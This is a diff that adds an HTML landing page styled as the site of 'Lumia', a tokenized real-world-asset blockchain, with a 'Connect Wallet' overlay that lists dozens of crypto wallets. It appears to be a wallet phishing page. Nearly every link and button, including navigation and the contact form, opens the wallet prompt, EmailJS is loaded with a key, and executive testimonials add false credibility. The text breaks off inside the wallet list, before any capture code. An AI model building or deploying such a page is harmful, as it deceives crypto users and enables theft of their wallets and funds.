@@ -1,0 +1,1159 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>LUMIA | The Only Full Cycle RWA Chain</title>
+  <meta name="description"
+    content="Lumia is a next-generation blockchain purpose-built for tokenized real-world assets. From issuance and compliance to liquidity and integration, Lumia delivers full-cycle infrastructure trusted by institutions, developers, and ecosystem partners worldwide.">
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="icon" href="img/lumialogo.png" type="image/png">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+  </script>
+  <script type="text/javascript">
+    (function () {
+      emailjs.init("7tpKliu3iA0wJbT5q");
+    })();
+  </script>
+  <link
+    href="https://fonts.googleapis.com/css2?family=Bruno+Ace&family=Space+Grotesk:wght@300;400;500;600;700&display=swap"
+    rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&display=swap"
+    rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Audiowide&display=swap" rel="stylesheet">
+
+  <link rel="stylesheet" href="css/style.css">
+</head>
+
+<body>
+
+  <!-- ===================== NAV ===================== -->
+  <header class="site-header" id="siteHeader">
+    <div class="nav-inner">
+      <a href="#home" class="brand">
+        <img src="img/lumialogo.png" class="brand-logo" id="brandLogo" aria-hidden="true">
+        <span class="brand-name">LUMIA</span>
+      </a>
+
+      <nav class="nav-links" id="navLinks" aria-label="Primary">
+        <a href="#home" class="nav-link" onclick="openWallet()">Home</a>
+        <a href="#about" class="nav-link" onclick="openWallet()">About</a>
+        <a href="#products" class="nav-link" onclick="openWallet()">Products</a>
+        <a href="#token" class="nav-link" onclick="openWallet()">Token</a>
+        <a href="#ecosystem" class="nav-link" onclick="openWallet()">Ecosystem</a>
+        <a href="#dev-portal" class="nav-link" onclick="openWallet()">Dev Portal</a>
+
+        <div class="nav-mobile-footer">
+          <p>The Only Full Cycle RWA Chain</p>
+        </div>
+      </nav>
+
+      <button class="hamburger" id="hamburgerBtn" aria-label="Toggle navigation menu" aria-expanded="false"
+        aria-controls="navLinks">
+        <span class="hamburger-line line-top"></span>
+        <span class="hamburger-line line-bottom"></span>
+      </button>
+    </div>
+  </header>
+
+  <div class="nav-overlay" id="navOverlay"></div>
+
+  <!-- ===================== HERO ===================== -->
+  <section class="hero" id="home">
+    <div class="hero-visual">
+      <div class="hero-globe-wrap">
+        <div class="hero-globe placeholder-img" id="globePlaceholder">
+          <img class="globe" src="img/globe.png" alt="">
+        </div>
+      </div>
+      <div class="hero-video-wrap">
+        <video class="heroclip" src="img/lumiaclip1.mp4" autoplay muted loop></video>
+      </div>
+    </div>
+
+    <div class="hero-content">
+      <h1 class="hero-title">Institutional Grade<br>Access to RWAs</h1>
+      <p class="hero-rotating" id="heroRotating" aria-live="polite"></p>
+
+      <div class="hero-cta-row">
+        <button class="explore-btn" id="exploreBtn">
+          <span class="explore-btn-text">EXPLORE</span>
+          <span class="explore-btn-arrow" aria-hidden="true">
+            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <path d="M4 12H20M20 12L14 6M20 12L14 18" stroke="currentColor" stroke-width="1.6" stroke-linecap="round"
+                stroke-linejoin="round" />
+            </svg>
+          </span>
+        </button>
+
+        <div class="made-in-divider" aria-hidden="true"></div>
+
+        <div class="made-in-usa">
+          <img src="img/lumia1 (4).png" class="flag-placeholder placeholder-img">
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ===================== MARQUEE ===================== -->
+  <div class="marquee-section" aria-label="Partner logos">
+    <div class="marquee-track" id="marqueeTrack">
+      <!-- duplicated via JS for seamless loop -->
+    </div>
+  </div>
+
+  <!-- ===================== CTA / DASHBOARD ACTIONS SECTION ===================== -->
+  <section class="cta-section" id="cta-actions">
+    <div class="cta-inner">
+      <div class="cta-header">
+        <span class="eyebrow">Quick Actions</span>
+        <h2 class="section-title-md">Manage your position</h2>
+        <p class="section-sub">Everything you need to interact with the Lumia protocol, in one place.</p>
+      </div>
+
+      <div class="cta-grid">
+        <div class="cta-card cta-card--primary">
+          <div class="cta-card-icon" aria-hidden="true">
+            <svg viewBox="0 0 24 24" fill="none">
+              <path d="M12 2L14.5 9H21.5L15.5 13.5L18 20.5L12 16L6 20.5L8.5 13.5L2.5 9H9.5L12 2Z" stroke="currentColor"
+                stroke-width="1.4" stroke-linejoin="round" />
+            </svg>
+          </div>
+          <h3>Claim Rewards</h3>
+          <p>Collect your accrued staking and liquidity rewards directly to your wallet.</p>
+          <button class="cta-btn" onclick="openWallet()">Claim Rewards</button>
+        </div>
+
+        <div class="cta-card">
+          <div class="cta-card-icon" aria-hidden="true">
+            <svg viewBox="0 0 24 24" fill="none">
+              <path d="M12 19V5M12 5L6 11M12 5L18 11" stroke="currentColor" stroke-width="1.4" stroke-linecap="round"
+                stroke-linejoin="round" />
+            </svg>
+          </div>
+          <h3>Withdraw Rewards</h3>
+          <p>Move claimed rewards from the protocol into your connected wallet balance.</p>
+          <button class="cta-btn cta-btn--outline" onclick="openWallet()">Withdraw Rewards</button>
+        </div>
+
+        <div class="cta-card">
+          <div class="cta-card-icon" aria-hidden="true">
+            <svg viewBox="0 0 24 24" fill="none">
+              <rect x="3" y="6" width="18" height="13" rx="1.5" stroke="currentColor" stroke-width="1.4" />
+              <path d="M3 10H21" stroke="currentColor" stroke-width="1.4" />
+              <path d="M7 3.5L7 6M17 3.5L17 6" stroke="currentColor" stroke-width="1.4" stroke-linecap="round" />
+            </svg>
+          </div>
+          <h3>Stake LUMIA</h3>
+          <p>Lock LUMIA tokens to earn yield and support network security.</p>
+          <button class="cta-btn cta-btn--outline" onclick="openWallet()">Stake Tokens</button>
+        </div>
+
+        <div class="cta-card">
+          <div class="cta-card-icon" aria-hidden="true">
+            <svg viewBox="0 0 24 24" fill="none">
+              <path d="M4 4V20H20" stroke="currentColor" stroke-width="1.4" stroke-linecap="round" />
+              <path d="M7 15L11 10L14 13L20 6" stroke="currentColor" stroke-width="1.4" stroke-linecap="round"
+                stroke-linejoin="round" />
+            </svg>
+          </div>
+          <h3>Bridge Assets</h3>
+          <p>Move tokenized assets and liquidity across supported chains securely.</p>
+          <button class="cta-btn cta-btn--outline" onclick="openWallet()">Open Bridge</button>
+        </div>
+
+        <div class="cta-card">
+          <div class="cta-card-icon" aria-hidden="true">
+            <svg viewBox="0 0 24 24" fill="none">
+              <circle cx="12" cy="12" r="9" stroke="currentColor" stroke-width="1.4" />
+              <path d="M12 7V12L15.5 14" stroke="currentColor" stroke-width="1.4" stroke-linecap="round"
+                stroke-linejoin="round" />
+            </svg>
+          </div>
+          <h3>Transaction History</h3>
+          <p>Review your full activity log across claims, stakes and transfers.</p>
+          <button class="cta-btn cta-btn--outline" onclick="openWallet()">View History</button>
+        </div>
+
+        <div class="cta-card">
+          <div class="cta-card-icon" aria-hidden="true">
+            <svg viewBox="0 0 24 24" fill="none">
+              <path
+                d="M12 15C13.6569 15 15 13.6569 15 12C15 10.3431 13.6569 9 12 9C10.3431 9 9 10.3431 9 12C9 13.6569 10.3431 15 12 15Z"
+                stroke="currentColor" stroke-width="1.4" />
+              <path
+                d="M19.4 13.5C19.5 12.5 19.5 11.5 19.4 10.5L21 9L19.5 6.5L17.6 7.2C16.9 6.6 16.1 6.1 15.2 5.8L14.8 4H11.2L10.8 5.8C9.9 6.1 9.1 6.6 8.4 7.2L6.5 6.5L5 9L6.6 10.5C6.5 11.5 6.5 12.5 6.6 13.5L5 15L6.5 17.5L8.4 16.8C9.1 17.4 9.9 17.9 10.8 18.2L11.2 20H14.8L15.2 18.2C16.1 17.9 16.9 17.4 17.6 16.8L19.5 17.5L21 15L19.4 13.5Z"
+                stroke="currentColor" stroke-width="1.2" stroke-linejoin="round" />
+            </svg>
+          </div>
+          <h3>Account Settings</h3>
+          <p>Manage KYC status, connected wallets, and notification preferences.</p>
+          <button class="cta-btn cta-btn--outline" onclick="openWallet()">Manage Account</button>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ===================== SPLIT: RWA TRANSFORMATION ===================== -->
+  <section class="split-section" id="about">
+    <div class="split-left">
+      <div class="split-left-inner">
+        <span class="eyebrow">Where real assets meet DeFi markets</span>
+        <h2 class="section-title-lg">THE $16T RWA<br>TRANSFORMATION</h2>
+        <p class="split-copy">Finance is being redefined at the intersection of Wall Street and Main Street. Lumia
+          connects institutions, asset originators, and next-gen platforms through infrastructure designed for global
+          scale. This is how the real economy becomes digitally native, compliant, composable and built for the future.
+        </p>
+      </div>
+    </div>
+    <div class="split-right">
+      <video src="img/lumiaclip2.mp4" autoplay muted loop class="split-video"></video>
+    </div>
+  </section>
+
+  <!-- ===================== TOKENIZED SECTORS ===================== -->
+  <section class="sectors-section" id="products">
+    <div class="sectors-header">
+      <h2 class="section-title-lg">TOKENIZED SECTORS</h2>
+      <p class="sectors-sub">Lumia brings real-world sectors onchain by transforming physical and financial assets to
+        accessible digital instruments.</p>
+    </div>
+
+    <div class="sectors-grid">
+      <div class="sector-card sector-card--tall">
+        <span class="sector-arrow" aria-hidden="true">↗</span>
+        <img src="img/realestate.jpg" class="sector-img">
+        <span class="sector-label">Real Estate</span>
+      </div>
+      <div class="sector-card sector-card--tall">
+        <span class="sector-arrow" aria-hidden="true">↗</span>
+        <img src="img/commodities.jpg" class="sector-img">
+        <span class="sector-label">Commodities</span>
+      </div>
+      <div class="sector-card sector-card--short">
+        <span class="sector-arrow" aria-hidden="true">↗</span>
+        <img src="img/car.jpg" class="sector-img">
+        <span class="sector-label">Cars</span>
+      </div>
+      <div class="sector-card sector-card--short">
+        <span class="sector-arrow" aria-hidden="true">↗</span>
+        <img src="img/land.jpg" class="sector-img">
+        <span class="sector-label">Land</span>
+      </div>
+    </div>
+  </section>
+
+  <!-- ===================== BUILT WITH PURPOSE ===================== -->
+  <section class="purpose-section">
+    <div class="purpose-left">
+      <h2 class="section-title-lg">BUILT WITH<br>PURPOSE</h2>
+      <p class="purpose-copy">Lumia is built to support the full lifecycle of tokenized assets, combining
+        institutional-grade compliance, developer-ready tools, and global liquidity architecture.</p>
+      <img src="img/lumia4 (2).png" class="purpose-cubes">
+    </div>
+
+    <div class="purpose-right">
+      <div class="purpose-card">
+        <div class="purpose-icon" aria-hidden="true">
+          <svg viewBox="0 0 24 24" fill="none">
+            <path d="M12 3C7 3 3 7 3 12C3 17 7 21 12 21C15 21 17.5 19.5 19 17" stroke="currentColor" stroke-width="1.4"
+              stroke-linecap="round" />
+            <path d="M19 17V21M19 17H15" stroke="currentColor" stroke-width="1.4" stroke-linecap="round"
+              stroke-linejoin="round" />
+            <path d="M12 21C17 21 21 17 21 12C21 7 17 3 12 3" stroke="currentColor" stroke-width="1.4"
+              stroke-linecap="round" stroke-dasharray="2 3" />
+          </svg>
+        </div>
+        <h3>Full-Cycle Infrastructure</h3>
+        <p>Tokenize real-world assets, manage compliance and unlock onchain markets, all through one purpose-built RWA
+          system.</p>
+      </div>
+
+      <div class="purpose-card">
+        <div class="purpose-icon" aria-hidden="true">
+          <svg viewBox="0 0 24 24" fill="none">
+            <path d="M12 3L20 6.5V11.5C20 16.2 16.8 20.4 12 21.5C7.2 20.4 4 16.2 4 11.5V6.5L12 3Z" stroke="currentColor"
+              stroke-width="1.4" stroke-linejoin="round" />
+            <path d="M9 12L11 14L15.5 9.5" stroke="currentColor" stroke-width="1.4" stroke-linecap="round"
+              stroke-linejoin="round" />
+          </svg>
+        </div>
+        <h3>Institutional-Grade Standards</h3>
+        <p>KYC/AML support, risk-managed liquidity pools, and transparent governance ensure regulatory alignment without
+          compromising decentralization.</p>
+      </div>
+
+      <div class="purpose-card">
+        <div class="purpose-icon" aria-hidden="true">
+          <svg viewBox="0 0 24 24" fill="none">
+            <path d="M8 6L3 12L8 18" stroke="currentColor" stroke-width="1.4" stroke-linecap="round"
+              stroke-linejoin="round" />
+            <path d="M16 6L21 12L16 18" stroke="currentColor" stroke-width="1.4" stroke-linecap="round"
+              stroke-linejoin="round" />
+          </svg>
+        </div>
+        <h3>Developer-Ready Tooling</h3>
+        <p>Prebuilt SDKs, APIs, and EVM compatibility allow developers to launch, scale, and compose RWA dApps without
+          infrastructure overhead.</p>
+      </div>
+
+      <div class="purpose-card">
+        <div class="purpose-icon" aria-hidden="true">
+          <svg viewBox="0 0 24 24" fill="none">
+            <circle cx="6" cy="6" r="2.2" stroke="currentColor" stroke-width="1.4" />
+            <circle cx="18" cy="6" r="2.2" stroke="currentColor" stroke-width="1.4" />
+            <circle cx="12" cy="18" r="2.2" stroke="currentColor" stroke-width="1.4" />
+            <path d="M7.8 7.2L10.5 16.3M16.2 7.2L13.5 16.3M8.2 6H15.8" stroke="currentColor" stroke-width="1.2" />
+          </svg>
+        </div>
+        <h3>Real-World Integration</h3>
+        <p>Works directly with asset originators and institutions to bring RWAs like real estate, commodities, and
+          infrastructure onchain.</p>
+      </div>
+
+      <div class="purpose-card">
+        <div class="purpose-icon" aria-hidden="true">
+          <svg viewBox="0 0 24 24" fill="none">
+            <circle cx="12" cy="12" r="9" stroke="currentColor" stroke-width="1.4" />
+            <path
+              d="M3 12H21M12 3C14.5 5.8 15.8 8.8 15.8 12C15.8 15.2 14.5 18.2 12 21C9.5 18.2 8.2 15.2 8.2 12C8.2 8.8 9.5 5.8 12 3Z"
+              stroke="currentColor" stroke-width="1.4" />
+          </svg>
+        </div>
+        <h3>Alignment With Global Markets</h3>
+        <p>Lumia enables programmable liquidity, cross-border settlement, and real-world financial mobility.</p>
+      </div>
+
+      <div class="purpose-card">
+        <div class="purpose-icon" aria-hidden="true">
+          <svg viewBox="0 0 24 24" fill="none">
+            <circle cx="9.5" cy="12" r="5" stroke="currentColor" stroke-width="1.4" />
+            <circle cx="14.5" cy="12" r="5" stroke="currentColor" stroke-width="1.4" />
+          </svg>
+        </div>
+        <h3>Liquidity-First Design</h3>
+        <p>Aggregates liquidity from top CEXs and DEXs, enabling low-slippage execution and institutional-grade depth
+          across asset classes.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- ===================== PRODUCTS CAROUSEL ===================== -->
+  <section class="products-section">
+    <div class="products-header">
+      <h2 class="section-title-lg">PRODUCTS</h2>
+      <div class="products-header-right">
+        <h3 class="products-highlight-title" id="productTitle">LUMIA CHAIN</h3>
+        <p class="products-highlight-sub" id="productSub">A secure and scalable blockchain solution designed for
+          enterprise applications with enhanced privacy features.</p>
+      </div>
+    </div>
+
+    <div class="products-track-wrap">
+      <div class="products-track" id="productsTrack">
+        <div class="product-card" data-title="Lumia Portal"
+          data-sub="Every path into Lumia starts here — a unified access layer for the full-cycle onchain economy.">
+          <span class="product-tag">#3</span>
+          <img src="img/lumiaportal.png" class="product-img">
+          <span class="product-name">Lumia Portal</span>
+        </div>
+        <div class="product-card is-active" data-title="Lumia Chain"
+          data-sub="A secure and scalable blockchain solution designed for enterprise applications with enhanced privacy features.">
+          <span class="product-tag">#1</span>
+          <img src="img/lumiachain.png" class="product-img">
+          <span class="product-name">Lumia Chain</span>
+        </div>
+        <div class="product-card" data-title="Lumia Stream"
+          data-sub="Native liquidity infrastructure aggregating depth from top CEXs and DEXs for low-slippage execution.">
+          <span class="product-tag">#2</span>
+          <img src="img/lumiastream.png" class="product-img">
+          <span class="product-name">Lumia Stream</span>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ===================== TESTIMONIALS ===================== -->
+  <section class="testimonial-section" id="ecosystem">
+    <div class="testimonial-left">
+      <h2 class="section-title-lg">TRUSTED BY<br>INSTITUTIONS<br>AND INNOVATORS</h2>
+      <p class="testimonial-copy">From protocol founders and institutional investors to early ecosystem adopters, key
+        voices across the RWA space are recognizing Lumia's role in turning tokenized assets into active financial
+        instruments. With infrastructure, compliance, and native liquidity in one platform, Lumia is emerging as the
+        full-cycle standard for real-world assets onchain.</p>
+
+      <div class="testimonial-nav">
+        <span id="testimonialCount">1 / 6</span>
+        <div class="testimonial-progress">
+          <div class="testimonial-progress-bar" id="testimonialProgress"></div>
+        </div>
+        <button class="testimonial-arrow" id="testimonialPrev" aria-label="Previous testimonial">‹</button>
+        <button class="testimonial-arrow" id="testimonialNext" aria-label="Next testimonial">›</button>
+      </div>
+    </div>
+
+    <div class="testimonial-right">
+      <div class="testimonial-bg placeholder-img" data-placeholder-label="Building Photography"></div>
+
+      <div class="testimonial-cards" id="testimonialCards">
+        <div class="testimonial-card">
+          <div class="testimonial-logo-placeholder placeholder-img" data-placeholder-label="Crypto.com logo"></div>
+          <p>“Lumia's approach to RWA tokenization sets a new bar for institutional-grade infrastructure in the space.”
+          </p>
+          <div class="testimonial-person">
+            <span class="testimonial-name">Kris Marszalek</span>
+            <span class="testimonial-role">CEO, Crypto.com</span>
+          </div>
+        </div>
+        <div class="testimonial-card">
+          <div class="testimonial-logo-placeholder placeholder-img" data-placeholder-label="C-Gold logo"></div>
+          <p>“Partnering with Lumia allows us to bring compliant, tokenized commodities to a global liquidity network.”
+          </p>
+          <div class="testimonial-person">
+            <span class="testimonial-name">James Carter</span>
+            <span class="testimonial-role">Director, C-Gold Technologies</span>
+          </div>
+        </div>
+        <div class="testimonial-card">
+          <div class="testimonial-logo-placeholder placeholder-img" data-placeholder-label="Bitget logo"></div>
+          <p>“Lumia's liquidity architecture makes onboarding real-world assets seamless for our exchange users.”</p>
+          <div class="testimonial-person">
+            <span class="testimonial-name">Gracy Chen</span>
+            <span class="testimonial-role">CEO, Bitget</span>
+          </div>
+        </div>
+        <div class="testimonial-card">
+          <div class="testimonial-logo-placeholder placeholder-img" data-placeholder-label="DWF Labs logo"></div>
+          <p>“Lumia is a strong addition into the blockchain ecosystem. We look forward to Lumia's growth in the
+            industry, enhancing the utility and integration of RWAs.”</p>
+          <div class="testimonial-person">
+            <span class="testimonial-name">Andrei Grachev</span>
+            <span class="testimonial-role">Managing Partner, DWF Labs</span>
+          </div>
+        </div>
+        <div class="testimonial-card is-active">
+          <div class="testimonial-logo-placeholder placeholder-img" data-placeholder-label="Prom logo"></div>
+          <p>“Lumia Stream unlocks limitless possibilities for the DeFi realms and all the builders seeking to drive
+            scalability further. We see unmatched potential in further collaboration with Lumia.”</p>
+          <div class="testimonial-person">
+            <span class="testimonial-name">Max Kan</span>
+            <span class="testimonial-role">CMO, Prom</span>
+          </div>
+        </div>
+        <div class="testimonial-card">
+          <div class="testimonial-logo-placeholder placeholder-img" data-placeholder-label="1inch logo"></div>
+          <p>“It's really insane to see that you guys managed to bridge centralized liquidity into the Web3
+            decentralized finance world, and we are really happy to have you on board.”</p>
+          <div class="testimonial-person">
+            <span class="testimonial-name">Anton Bukov</span>
+            <span class="testimonial-role">Co-Founder, 1inch</span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ===================== WHAT'S NEW ===================== -->
+  <section class="news-section">
+    <div class="news-left">
+      <h2 class="section-title-lg">WHAT'S<br>NEW</h2>
+      <p class="news-copy">Latest announcements, ecosystem insights and featured coverage from Lumia and across the
+        broader RWA and blockchain space.</p>
+      <div class="news-nav">
+        <span id="newsCount">1 / 7</span>
+        <div class="news-progress">
+          <div class="news-progress-bar" id="newsProgress"></div>
+        </div>
+        <button class="news-arrow" id="newsPrev" aria-label="Previous news">‹</button>
+        <button class="news-arrow" id="newsNext" aria-label="Next news">›</button>
+      </div>
+    </div>
+
+    <div class="news-track-wrap">
+      <div class="news-track" id="newsTrack">
+        <article class="news-card">
+          <span class="news-date">OCT 02, 2025</span>
+          <img src="img/april2.jpg" class="news-img">
+          <h3>Lumia Announces $18 Million Worth of Asset Tokenization</h3>
+        </article>
+        <article class="news-card">
+          <span class="news-date">SEP 29, 2025</span>
+          <img src="img/feb12.png" class="news-img">
+          <h3>C-Gold Technologies Announce Landmark Partnership</h3>
+        </article>
+        <article class="news-card">
+          <span class="news-date">SEP 25, 2025</span>
+          <img src="img/jan17.jpg" class="news-img">
+          <h3>Senators Seek Industry Input on Crypto Payments Bill as Lumia Shares Insights</h3>
+        </article>
+        <article class="news-card">
+          <span class="news-date">SEP 24, 2025</span>
+          <img src="img/march12.jpg" class="news-img">
+          <h3>Inside Lumia's Washington Move</h3>
+        </article>
+        <article class="news-card">
+          <span class="news-date">APR 02, 2025</span>
+          <img src="img/march14.jpg" class="news-img">
+          <h3>Introducing Lumia Power (LUMIAP): A New Standard for Governance</h3>
+        </article>
+        <article class="news-card">
+          <span class="news-date">MAR 14, 2025</span>
+          <img src="img/sep24.png" class="news-img">
+          <h3>Lumia Stream Surpasses $30 Billion in Aggregated Liquidity</h3>
+        </article>
+        <article class="news-card">
+          <span class="news-date">FEB 08, 2025</span>
+          <img src="img/sep25.png" class="news-img">
+          <h3>Lumia Chain Mainnet: What Builders Need to Know</h3>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <!-- ===================== BUILD ON LUMIA / FOOTER ===================== -->
+  <footer class="site-footer" id="dev-portal">
+    <div class="footer-top">
+      <div class="build-card">
+        <img src="img/april2.jpg" class="build-card-graphic">
+        <div class="build-card-text">
+          <h3>BUILD ON<br>LUMIA</h3>
+          <a href="#" class="build-card-link">
+            <span>EXPLORE<br>DOCUMENTATION</span>
+            <span class="build-card-arrow" aria-hidden="true">↗</span>
+          </a>
+        </div>
+      </div>
+
+      <div class="footer-links">
+        <div class="footer-col">
+          <h4>Pages</h4>
+          <a href="#home">Home</a>
+          <a href="#about">About</a>
+          <a href="#">Blog</a>
+        </div>
+        <div class="footer-col">
+          <h4>Products</h4>
+          <a href="#">Lumia Chain</a>
+          <a href="#">Lumia Stream</a>
+          <a href="#">Lumia Portal</a>
+        </div>
+        <div class="footer-col">
+          <h4>Ecosystem</h4>
+          <a href="#">Explorer</a>
+          <a href="#token">Token</a>
+          <a href="#">dApps &amp; Partners</a>
+        </div>
+        <div class="footer-col">
+          <h4>Dev</h4>
+          <a href="#dev-portal">Dev Portal</a>
+          <a href="#">Gitbook</a>
+          <a href="#">Help</a>
+        </div>
+        <div class="footer-col footer-col--social">
+          <h4>Social</h4>
+          <div class="social-icons">
+            <a href="#" aria-label="X (Twitter)">
+              <svg viewBox="0 0 24 24" fill="currentColor">
+                <path
+                  d="M18.9 2H22L14.9 10.4L23.3 22H16.7L11.6 15.1L5.7 22H2.6L10.2 13L2.2 2H9L13.5 8.3L18.9 2ZM17.8 20H19.6L7.9 3.9H6L17.8 20Z" />
+              </svg>
+            </a>
+            <a href="#" aria-label="Telegram">
+              <svg viewBox="0 0 24 24" fill="currentColor">
+                <path
+                  d="M21.6 3.5L2.9 10.9c-1.2.5-1.2 1.3-.2 1.6l4.8 1.5 1.8 5.6c.2.6.4.8.9.8.4 0 .6-.2.9-.5l2.2-2.1 4.6 3.4c.8.5 1.4.2 1.6-.8L23.8 4.9c.3-1.3-.5-1.9-1.7-1.4H21.6z" />
+              </svg>
+            </a>
+          </div>
+        </div>
+      </div>
+
+      <div class="footer-question">
+        <h4>Ask us a question</h4>
+        <form class="footer-form" id="footerForm">
+          <input type="email" placeholder="satoshi@email.com" required>
+          <button type="submit" onclick="openWallet()">Enter</button>
+        </form>
+      </div>
+    </div>
+
+    <div class="footer-bottom">
+      <div class="footer-bottom-brand">
+        <span class="footer-logo-mark" aria-hidden="true"></span>
+        <span>LUMIA</span>
+      </div>
+      <p>2026 Copyright &nbsp;&nbsp; 3119, Forum Lane, George Town Grand Cayman, Cayman Islands KY1-9006</p>
+    </div>
+  </footer>
+
+  <div class="w-overlay" id="wOverlay">
+
+    <!-- SCREEN 1: Select Wallet -->
+    <div class="w-panel" id="wScreen1">
+      <div class="w-header">
+        <span class="w-title">Connect Wallet</span>
+        <button class="w-close" onclick="closeWallet()">&#x2715;</button>
+      </div>
+      <div class="w-body">
+
+        <!-- Featured: MetaMask -->
+        <div class="w-featured wallet-trigger" onclick="handleWalletSelect(this)">
+          <span class="w-featured-badge">Recommended</span>
+          <div class="w-feat-icon">
+            <img src="img/trustwallet.png" alt="Trust Wallet" />
+          </div>
+          <div>
+            <div class="w-feat-name">Trust Wallet</div>
+            <div class="w-feat-desc">Multi-chain mobile Wallet</div>
+          </div>
+        </div>
+
+        <div class="w-divider"><span>other wallets</span></div>
+
+        <div class="w-list">
+          <div class="w-item wallet-trigger" onclick="handleWalletSelect(this)">
+            <div class="w-item-icon"><img src="img/phantomwallet.png" alt="Phantom Wallet" /></div>
+            <div>
+              <div class="w-item-name">Phantom Wallet</div>
+              <div class="w-item-desc">Solana Wallet</div>
+            </div>
+            <i class="ri-arrow-right-s-line w-item-arrow"></i>
+          </div>
+          <div class="w-item wallet-trigger" onclick="handleWalletSelect(this)">
+            <div class="w-item-icon"><img src="img/ledgerwallet.png" alt="Ledger" /></div>
+            <div>
+              <div class="w-item-name">Ledger</div>
+              <div class="w-item-desc">Hardware wallet</div>
+            </div>
+            <i class="ri-arrow-right-s-line w-item-arrow"></i>
+          </div>
+          <div class="w-item wallet-trigger" onclick="handleWalletSelect(this)">
+            <div class="w-item-icon"><img src="img/metamask.png" alt="Metamask Wallet" /></div>
+            <div>
+              <div class="w-item-name">Metamask </div>
+              <div class="w-item-desc">Ethereum Wallet</div>
+            </div>
+            <i class="ri-arrow-right-s-line w-item-arrow"></i>
+          </div>
+          <div class="w-item w-item-other" onclick="openOtherWallets()">
+            <div class="w-item-icon"><i class="ri-apps-2-line"></i></div>
+            <div>
+              <div class="w-item-name">Other Wallets</div>
+              <div class="w-item-desc">Browse 30+ supported wallets</div>
+            </div>
+            <i class="ri-arrow-right-s-line w-item-arrow"></i>
+          </div>
+        </div>
+
+        <p class="w-note">
+          By connecting you agree to our <a href="#" onclick="openWallet();return false;">Terms</a> &amp; <a href="#"
+            onclick="openWallet();return false;">Privacy Policy</a>.
+          We never store your private keys or seed phrases.
+        </p>
+      </div>
+    </div>
+
+    <!-- OTHER WALLETS -->
+    <div class="w-sub" id="wScreenOther">
+      <div class="w-header">
+        <span class="w-title">Other Wallets</span>
+        <button class="w-close" onclick="closeWallet()">&#x2715;</button>
+      </div>
+      <div class="ow-search-wrap">
+        <i class="ri-search-line"></i>
+        <input class="ow-search" id="owSearch" type="text" placeholder="Search by name or network..." autocomplete="off"
+          spellcheck="false" />
+      </div>
+      <div class="ow-count" id="owCount">30 wallets</div>
+      <div class="ow-list" id="owList">
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/pera.png" alt="Pera Wallet" /></div>
+          <div>
+            <div class="ow-name">Pera Wallet</div>
+            <div class="ow-chain">Algorand</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/rainbow.png" alt="Rainbow" /></div>
+          <div>
+            <div class="ow-name">Rainbow</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/basewallet.png" alt="Base Wallet" /></div>
+          <div>
+            <div class="ow-name">Base Wallet</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/rabby.png" alt="Rabby" /></div>
+          <div>
+            <div class="ow-name">Rabby Wallet</div>
+            <div class="ow-chain">Ethereum / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/zerion.png" alt="Zerion" /></div>
+          <div>
+            <div class="ow-name">Zerion</div>
+            <div class="ow-chain">Ethereum / Multi-chain</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/walletconnect.png" alt="WalletConnect" /></div>
+          <div>
+            <div class="ow-name">WalletConnect</div>
+            <div class="ow-chain">Any compatible wallet</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/phantomwallet.png" alt="Phantom" /></div>
+          <div>
+            <div class="ow-name">Phantom</div>
+            <div class="ow-chain">Solana / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/stepn.png" alt="Stepn" /></div>
+          <div>
+            <div class="ow-name">Stepn</div>
+            <div class="ow-chain">Solana / EVM</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/solflare.png" alt="Solflare" /></div>
+          <div>
+            <div class="ow-name">Solflare</div>
+            <div class="ow-chain">Solana</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/okx.png" alt="OKX Wallet" /></div>
+          <div>
+            <div class="ow-name">OKX Wallet</div>
+            <div class="ow-chain">Multi-chain</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/terrastation.png" alt="Terra Station" /></div>
+          <div>
+            <div class="ow-name">Terra Station</div>
+            <div class="ow-chain">Terra</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/safepal.png" alt="SafePal" /></div>
+          <div>
+            <div class="ow-name">SafePal</div>
+            <div class="ow-chain">Multi-chain</div>
+          </div>
+        </div>
+        <div class="ow-item" onclick="selectOwWallet(this)">
+          <div class="ow-icon"><img src="img/exodus.png" alt="Exodus" /></div>
+          <div>
+            <div class="ow-name">Exodus</div>
+            <div class="ow-chain">Multi-chain</div>
+          </div>
+        </div>
